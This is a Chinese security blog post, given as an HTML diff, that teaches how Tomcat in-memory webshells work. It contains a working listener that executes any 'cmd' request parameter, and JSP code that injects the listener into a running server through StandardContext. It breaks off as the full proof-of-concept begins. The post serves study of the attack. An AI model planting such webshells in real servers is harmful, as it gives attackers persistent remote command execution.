@@ -1,0 +1,983 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sloth">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JavaWeb内存马0x00 前置知识简介内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。 Tomcat中的三">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaWeb内存马学习">
+<meta property="og:url" content="http://sloth31.github.io/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Sloth&#39;s Blog">
+<meta property="og:description" content="JavaWeb内存马0x00 前置知识简介内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。 Tomcat中的三">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png">
+<meta property="article:published_time" content="2023-01-20T15:29:13.000Z">
+<meta property="article:modified_time" content="2023-12-07T14:42:20.992Z">
+<meta property="article:author" content="Sloth">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png">
+  
+  
+  
+  <title>JavaWeb内存马学习 | Sloth&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sloth&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JavaWeb内存马学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-20 23:29" pubdate>
+          2023年1月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          40k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          222 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">JavaWeb内存马学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JavaWeb内存马"><a href="#JavaWeb内存马" class="headerlink" title="JavaWeb内存马"></a>JavaWeb内存马</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的<strong>动态注册</strong>。</p>
+<h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png" srcset="/img/loading.gif" lazyload alt="image-20230131214733513"></p>
+<h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，能对Servlet中的各种资源进行访问、添加、删除等。其在Java中的具体实现是<code>javax.servlet.ServletContext</code>接口</p>
+<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。</p>
+<p>Tomcat这里使用了<code>门面模式</code>，对<code>ApplicationContext</code>类进行了封装，我们调用<code>getServletContext()</code>方法获得的其实是<code>ApplicationContextFacade</code>类(门面类)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ApplicationContextFacade</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.context = context;<span class="hljs-comment">//context的传递</span><br> <br>        classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>        initClassCache();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>ApplicationContextFacade</code>类方法中都会调用this.context相应的方法，因此最终调用的还是<code>ApplicationContext</code>类的方法。</p>
+<blockquote>
+<p>门面模式可以简单分为三个部分:子系统、门面(Facade)、客户端</p>
+<p>客户端可以通过调用门面方法进而调用集成的子系统方法，以医院类比，客户端相当于病人，门面相当于接待员，而子系统是医院内部细化的各部门。</p>
+</blockquote>
+<h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p>
+<p><code>ApplicationContext</code>中的许多方法实际上还是调用了<code>StandardContext</code>中的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext context;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestCharacterEncoding</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">return</span> context.getRequestCharacterEncoding();<br>      &#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png" srcset="/img/loading.gif" lazyload alt="image-20230131221926469"></p>
+<blockquote>
+<p>可以看出我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p>
+</blockquote>
+<h2 id="0x01-Tomcat内存马"><a href="#0x01-Tomcat内存马" class="headerlink" title="0x01 Tomcat内存马"></a>0x01 Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>这依赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，为方便调试，先加入Tomcat依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意版本与本机tomcat匹配，tomcat10后把很多常用类的位置都改了</p>
+</blockquote>
+<h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>目标就是在服务器中动态注册一个恶意的Listener。</p>
+<p>而Listener根据事件源的不同，大致可以分为如下三种</p>
+<ul>
+<li>ServletContextListener</li>
+<li>HttpSessionListener</li>
+<li>ServletRequestListener</li>
+</ul>
+<blockquote>
+<p><code>ServletRequestListener</code>用于监听<code>ServletRequest</code>对象，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法</p>
+</blockquote>
+<p>创建一个Servlet项目实现恶意Listener,目录配置⬇️</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png" srcset="/img/loading.gif" lazyload alt="image-20230201014157169"></p>
+<p>shell_Listener</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问任意目录可以执行命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png" srcset="/img/loading.gif" lazyload alt="image-20230201014602139"></p>
+<blockquote>
+<p>接下来只要将恶意Listener动态注册进服务器</p>
+</blockquote>
+<h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">requestInitialized:<span class="hljs-number">13</span>, shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>StandardContext#fireRequestInitEvent</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br>        Object instances[] = getApplicationEventListeners();<span class="hljs-comment">//获取Listener数组</span><br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<span class="hljs-comment">//遍历触发数组内各Listener的requestInitialized方法</span><br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进第一行的<code>getApplicationEventListeners()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<span class="hljs-comment">//存储里Listener</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>    <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png" srcset="/img/loading.gif" lazyload alt="image-20230201015745831"></p>
+<p><code>StandardContext</code>也定义类添加Listener的方法,那么我们为了注册恶意Listener，就必须先获取<code>StandardContext</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-comment">// Select the Context to be used for this Request</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br></code></pre></td></tr></table></figure>
+
+<p>JSP内置了request对象,因此我们可以通过反射获取</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>也可以利用类加载器</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>	<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>再添加一下上面写的恶意Listener</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>	<span class="hljs-type">shell_Listener</span> <span class="hljs-variable">shell_listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">shell_Listener</span>();<br>  context.addApplicationEventListener(shell_listener);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>Listener.jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span 